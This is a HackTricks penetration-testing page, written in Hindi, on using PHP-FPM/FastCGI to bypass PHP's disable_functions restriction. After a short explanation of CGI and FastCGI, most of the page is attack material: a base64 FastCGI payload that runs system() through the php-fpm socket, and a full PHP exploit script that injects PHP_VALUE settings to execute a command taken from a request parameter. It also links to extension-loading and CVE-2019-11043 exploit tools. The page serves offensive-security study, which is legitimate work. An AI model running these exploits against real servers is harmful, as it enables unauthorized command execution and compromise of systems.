# disable_functions bypass - php-fpm/FastCGI

{{#include ../../../../banners/hacktricks-training.md}}

## PHP-FPM

**PHP-FPM** को मानक PHP FastCGI के **उच्चतर विकल्प** के रूप में प्रस्तुत किया गया है, जो विशेष रूप से **उच्च ट्रैफ़िक वाली वेबसाइटों के लिए लाभकारी** सुविधाएँ प्रदान करता है। यह एक मास्टर प्रक्रिया के माध्यम से कार्यकर्ता प्रक्रियाओं के एक समूह की निगरानी करता है। PHP स्क्रिप्ट अनुरोध के लिए, यह वेब सर्वर है जो **PHP-FPM सेवा के लिए एक FastCGI प्रॉक्सी कनेक्शन शुरू करता है**। इस सेवा में **सर्वर पर नेटवर्क पोर्ट या यूनिक्स सॉकेट के माध्यम से अनुरोध प्राप्त करने की क्षमता** होती है।

प्रॉक्सी कनेक्शन की मध्यस्थ भूमिका के बावजूद, PHP-FPM को वेब सर्वर के समान मशीन पर कार्यशील होना आवश्यक है। इसका उपयोग किया जाने वाला कनेक्शन, जबकि प्रॉक्सी-आधारित है, पारंपरिक प्रॉक्सी कनेक्शनों से भिन्न है। एक अनुरोध प्राप्त करने पर, PHP-FPM से एक उपलब्ध कार्यकर्ता इसे संसाधित करता है—PHP स्क्रिप्ट को निष्पादित करता है और फिर परिणामों को वेब सर्वर को अग्रेषित करता है। एक कार्यकर्ता जब एक अनुरोध को संसाधित करना समाप्त कर लेता है, तो यह आगामी अनुरोधों के लिए फिर से उपलब्ध हो जाता है।

## लेकिन CGI और FastCGI क्या है?

### CGI

सामान्यतः वेब पृष्ठ, फ़ाइलें और सभी दस्तावेज़ जो वेब सर्वर से ब्राउज़र में स्थानांतरित होते हैं, एक विशेष सार्वजनिक निर्देशिका जैसे home/user/public_html में संग्रहीत होते हैं। **जब ब्राउज़र कुछ सामग्री का अनुरोध करता है, तो सर्वर इस निर्देशिका की जांच करता है और आवश्यक फ़ाइल को ब्राउज़र को भेजता है**।

यदि **CGI** सर्वर पर स्थापित है, तो विशेष cgi-bin निर्देशिका भी वहाँ जोड़ी जाती है, जैसे home/user/public_html/cgi-bin। CGI स्क्रिप्ट इस निर्देशिका में संग्रहीत होती हैं। **निर्देशिका में प्रत्येक फ़ाइल को एक निष्पादन योग्य कार्यक्रम के रूप में माना जाता है**। जब निर्देशिका से एक स्क्रिप्ट तक पहुँचते हैं, तो सर्वर फ़ाइल की सामग्री को ब्राउज़र को भेजने के बजाय, इस स्क्रिप्ट के लिए जिम्मेदार एप्लिकेशन को अनुरोध भेजता है। **इनपुट डेटा प्रोसेसिंग पूरी होने के बाद, एप्लिकेशन आउटपुट डेटा** को वेब सर्वर को भेजता है जो डेटा को HTTP क्लाइंट को अग्रेषित करता है।

उदाहरण के लिए, जब CGI स्क्रिप्ट [http://mysitename.com/**cgi-bin/file.pl**](http://mysitename.com/**cgi-bin/file.pl**) तक पहुँचती है, तो सर्वर CGI के माध्यम से उपयुक्त पर्ल एप्लिकेशन को चलाएगा। स्क्रिप्ट निष्पादन से उत्पन्न डेटा एप्लिकेशन द्वारा वेब सर्वर को भेजा जाएगा। सर्वर, दूसरी ओर, डेटा को ब्राउज़र में स्थानांतरित करेगा। यदि सर्वर में CGI नहीं होता, तो ब्राउज़र **.pl** फ़ाइल कोड को स्वयं प्रदर्शित करता। (व्याख्या [यहाँ](https://help.superhosting.bg/en/cgi-common-gateway-interface-fastcgi.html) से)

### FastCGI

[FastCGI](https://en.wikipedia.org/wiki/FastCGI) एक नई वेब तकनीक है, जो एक सुधारित [CGI](http://en.wikipedia.org/wiki/Common_Gateway_Interface) संस्करण है क्योंकि मुख्य कार्यक्षमता समान रहती है।

FastCGI विकसित करने की आवश्यकता यह है कि वेब एप्लिकेशनों के तेजी से विकास और जटिलता के कारण उत्पन्न हुआ, साथ ही CGI तकनीक की स्केलेबिलिटी की कमियों को दूर करने के लिए। इन आवश्यकताओं को पूरा करने के लिए [Open Market](http://en.wikipedia.org/wiki/Open_Market) ने **FastCGI – CGI तकनीक का एक उच्च प्रदर्शन संस्करण जो उन्नत क्षमताओं के साथ है, पेश किया।**

## disable_functions bypass

यह संभव है कि PHP कोड को FastCGI का दुरुपयोग करके चलाया जाए और `disable_functions` सीमाओं से बचा जाए।

### Via Gopherus

> [!CAUTION]
> मुझे नहीं पता कि यह आधुनिक संस्करणों में काम कर रहा है या नहीं क्योंकि मैंने एक बार कोशिश की थी और यह कुछ भी निष्पादित नहीं किया। कृपया, यदि आपके पास इसके बारे में अधिक जानकारी है तो मुझसे संपर्क करें \[**PEASS & HackTricks टेलीग्राम समूह यहाँ**]\([**https://t.me/peass**](https://t.me/peass)), या ट्विटर \[**@carlospolopm**]\([**https://twitter.com/hacktricks_live**](https://twitter.com/hacktricks_live))**।**

[Gopherus](https://github.com/tarunkant/Gopherus) का उपयोग करके आप एक पेलोड उत्पन्न कर सकते हैं जिसे FastCGI श्रोता को भेजा जा सके और मनमाने आदेश निष्पादित किए जा सकें:

![](<../../../../images/image (227).png>)

फिर, आप URL-encoded पेलोड को पकड़ सकते हैं और इसे डिकोड कर सकते हैं और base64 में परिवर्तित कर सकते हैं, \[**उदाहरण के लिए इस साइबरशेफ की विधि का उपयोग करते हुए**]\([http://icyberchef.com/#recipe=URL_Decode%28%29To_Base64%28'A-Za-z0-9%2B/%3D'%29\&input=JTAxJTAxJTAwJTAxJTAwJTA4JTAwJTAwJTAwJTAxJTAwJTAwJTAwJTAwJTAwJTAwJTAxJTA0JTAwJTAxJTAxJTA0JTA0JTAwJTBGJTEwU0VSVkVSX1NPRlRXQVJFZ28lMjAvJTIwZmNnaWNsaWVudCUyMCUwQiUwOVJFTU9URV9BRERSMTI3LjAuMC4xJTBGJTA4U0VSVkVSX1BST1RPQ09MSFRUUC8xLjElMEUlMDJDT05URU5UX0xFTkdUSDc2JTBFJTA0UkVRVUVTVF9NRVRIT0RQT1NUJTA5S1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlJTIwJTNEJTIwT24lMEFkaXNhYmxlX2Z1bmN0aW9ucyUyMCUzRCUyMCUwQWF1dG9fcHJlcGVuZF9maWxlJTIwJTNEJTIwcGhwJTNBLy9pbnB1dCUwRiUxN1NDUklQVF9GSUxFTkFNRS92YXIvd3d3L2h0bWwvaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDBMJTA0JTAwJTNDJTNGcGhwJTIwc3lzdGVtJTI4JTI3d2hvYW1pJTIwJTNFJTIwL3RtcC93aG9hbWkudHh0JTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNpeUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAw](http://icyberchef.com/#recipe=URL_Decode%28%29To_Base64%28'A-Za-z0-9%2B/%3D'%29&input=JTAxJTAxJTAwJTAxJTAwJTA4JTAwJTAwJTAwJTAxJTAwJTAwJTAwJTAwJTAwJTAwJTAxJTA0JTAwJTAxJTAxJTA0JTA0JTAwJTBGJTEwU0VSVkVSX1NPRlRXQVJFZ28lMjAvJTIwZmNnaWNsaWVudCUyMCUwQiUwOVJFTU9URV9BRERSMTI3LjAuMC4xJTBGJTA4U0VSVkVSX1BST1RPQ09MSFRUUC8xLjElMEUlMDJDT05URU5UX0xFTkdUSDc2JTBFJTA0UkVRVUVTVF9NRVRIT0RQT1NUJTA5S1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlJTIwJTNEJTIwT24lMEFkaXNhYmxlX2Z1bmN0aW9ucyUyMCUzRCUyMCUwQWF1dG9fcHJlcGVuZF9maWxlJTIwJTNEJTIwcGhwJTNBLy9pbnB1dCUwRiUxN1NDUklQVF9GSUxFTkFNRS92YXIvd3d3L2h0bWwvaW5kZXgucGhwJTBEJTAxRE9DVU1FTlRfUk9PVC8lMDAlMDAlMDAlMDAlMDElMDQlMDAlMDElMDAlMDAlMDAlMDAlMDElMDUlMDAlMDElMDBMJTA0JTAwJTNDJTNGcGhwJTIwc3lzdGVtJTI4JTI3d2hvYW1pJTIwJTNFJTIwL3RtcC93aG9hbWkudHh0JTI3JTI5JTNCZGllJTI4JTI3LS0tLS1NYWRlLWJ5LVNpeUQzci0tLS0tJTBBJTI3JTI5JTNCJTNGJTNFJTAwJTAwJTAwJTAw)). और फिर इस PHP कोड में base64 को कॉपी/पेस्ट करें:
```php
<?php
$fp = fsockopen("unix:///var/run/php/php7.0-fpm.sock", -1, $errno, $errstr, 30); fwrite($fp,base64_decode("AQEAAQAIAAAAAQAAAAAAAAEEAAEBBAQADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOAkNPTlRFTlRfTEVOR1RINzYOBFJFUVVFU1RfTUVUSE9EUE9TVAlLUEhQX1ZBTFVFYWxsb3dfdXJsX2luY2x1ZGUgPSBPbgpkaXNhYmxlX2Z1bmN0aW9ucyA9IAphdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DxdTQ1JJUFRfRklMRU5BTUUvdmFyL3d3dy9odG1sL2luZGV4LnBocA0BRE9DVU1FTlRfUk9PVC8AAAAAAQQAAQAAAAABBQABAEwEADw/cGhwIHN5c3RlbSgnd2hvYW1pID4gL3RtcC93aG9hbWkudHh0Jyk7ZGllKCctLS0tLU1hZGUtYnktU3B5RDNyLS0tLS0KJyk7Pz4AAAAA"));
```
इस स्क्रिप्ट को अपलोड और एक्सेस करने पर एक्सप्लॉइट FastCGI ( `disable_functions` को अक्षम करते हुए) को भेजा जाएगा और **निर्धारित कमांड्स को निष्पादित किया जाएगा**।

### PHP एक्सप्लॉइट

> [!CAUTION]
> मुझे नहीं पता कि यह आधुनिक संस्करणों में काम कर रहा है क्योंकि मैंने एक बार कोशिश की थी और मैं कुछ भी निष्पादित नहीं कर सका। वास्तव में, मैंने देखा कि FastCGI निष्पादन से `phpinfo()` ने संकेत दिया कि `disable_functions` खाली था, लेकिन PHP (किसी तरह) मुझे किसी भी पूर्व में अक्षम की गई फ़ंक्शन को निष्पादित करने से रोक रहा था। कृपया, यदि आपके पास इस बारे में अधिक जानकारी है तो मुझसे संपर्क करें \[**PEASS & HackTricks टेलीग्राम समूह यहाँ**]\([**https://t.me/peass**](https://t.me/peass)), या ट्विटर \[**@carlospolopm**]\([**https://twitter.com/hacktricks_live**](https://twitter.com/hacktricks_live))**।**

[यहाँ](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy) से कोड।
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); phpinfo(); ?>"; // php payload -- Doesnt do anything
$php_value = "disable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "disable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
पिछली फ़ंक्शन का उपयोग करते हुए आप देखेंगे कि फ़ंक्शन **`system`** **अभी भी निष्क्रिय** है लेकिन **`phpinfo()`** **`disable_functions`** **खाली** दिखाता है:

![](<../../../../images/image (188).png>)

![](<../../../../images/image (713).png>)

**तो, मुझे लगता है कि आप केवल `disable_functions` को php `.ini` कॉन्फ़िग फ़ाइलों के माध्यम से सेट कर सकते हैं और PHP_VALUE उस सेटिंग को ओवरराइड नहीं करेगा।**

### [**FuckFastGCI**](https://github.com/w181496/FuckFastcgi)

यह एक php स्क्रिप्ट है जो `open_basedir` और `disable_functions` को बायपास करने के लिए fastcgi प्रोटोकॉल का शोषण करती है।\
यह आपको दुर्भावनापूर्ण एक्सटेंशन लोड करके कड़े `disable_functions` को RCE में बायपास करने में मदद करेगी।\
आप इसे यहाँ एक्सेस कर सकते हैं: [https://github.com/w181496/FuckFastcgi](https://github.com/w181496/FuckFastcgi) या यहाँ एक थोड़ी संशोधित और सुधारित संस्करण: [https://github.com/BorelEnzo/FuckFastcgi](https://github.com/BorelEnzo/FuckFastcgi)

आप पाएंगे कि शोषण पिछले कोड के बहुत समान है, लेकिन `disable_functions` को PHP_VALUE का उपयोग करके बायपास करने के बजाय, यह कोड निष्पादित करने के लिए `PHP_ADMIN_VALUE` के अंदर `extension_dir` और `extension` पैरामीटर का उपयोग करके **एक बाहरी PHP मॉड्यूल लोड करने** की कोशिश करता है।\
**NOTE1**: आपको संभवतः **सर्वर द्वारा उपयोग की जा रही PHP संस्करण के साथ** एक्सटेंशन को **फिर से संकलित** करने की आवश्यकता होगी (आप इसे phpinfo के आउटपुट के अंदर जांच सकते हैं):

![](<../../../../images/image (180).png>)

> [!CAUTION]
> **NOTE2**: मैंने इसे `extension_dir` और `extension` मानों को एक PHP `.ini` कॉन्फ़िग फ़ाइल के अंदर डालकर काम करने में सफल रहा (कुछ ऐसा जो आप एक सर्वर पर हमला करते समय नहीं कर पाएंगे)। लेकिन किसी कारण से, जब इस शोषण का उपयोग करते हुए और `PHP_ADMIN_VALUE` वेरिएबल से एक्सटेंशन लोड करते हुए प्रक्रिया बस मर गई, इसलिए मुझे नहीं पता कि यह तकनीक अभी भी मान्य है या नहीं।

### PHP-FPM रिमोट कोड निष्पादन भेद्यता (CVE-2019–11043)

आप इस भेद्यता का शोषण [**phuip-fpizdam**](https://github.com/neex/phuip-fpizdam) के साथ कर सकते हैं और इस डॉकर वातावरण का उपयोग करके परीक्षण कर सकते हैं: [https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)।\
आप इस भेद्यता का विश्लेषण [**यहाँ**](https://medium.com/@knownsec404team/php-fpm-remote-code-execution-vulnerability-cve-2019-11043-analysis-35fd605dd2dc)** भी पा सकते हैं।**

{{#include ../../../../banners/hacktricks-training.md}}
